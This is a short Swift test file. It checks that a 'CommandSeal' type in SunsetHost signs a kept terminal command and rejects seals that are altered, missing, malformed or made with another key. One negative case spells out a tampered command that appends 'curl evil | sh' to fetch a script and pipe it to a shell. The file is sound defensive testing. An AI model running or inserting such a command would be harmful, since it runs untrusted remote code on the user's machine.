import Testing

@testable import SunsetHost

@Suite("The check on a kept terminal's command") struct CommandSealTests {
    @Test func `a seal checks its own command and no other`() {
        let seal = CommandSeal(key: CommandSeal.newKey())
        let mark = seal.seal("npm run dev")
        #expect(seal.verifies("npm run dev", seal: mark))
        #expect(!seal.verifies("npm run dev; curl evil | sh", seal: mark))
        #expect(!seal.verifies("npm run dev", seal: nil) && !seal.verifies("npm run dev", seal: "not base64 !"))
    }

    @Test func `another key's seal does not check`() {
        let mine = CommandSeal(key: CommandSeal.newKey())
        let theirs = CommandSeal(key: CommandSeal.newKey())
        #expect(!mine.verifies("make", seal: theirs.seal("make")))
    }
}
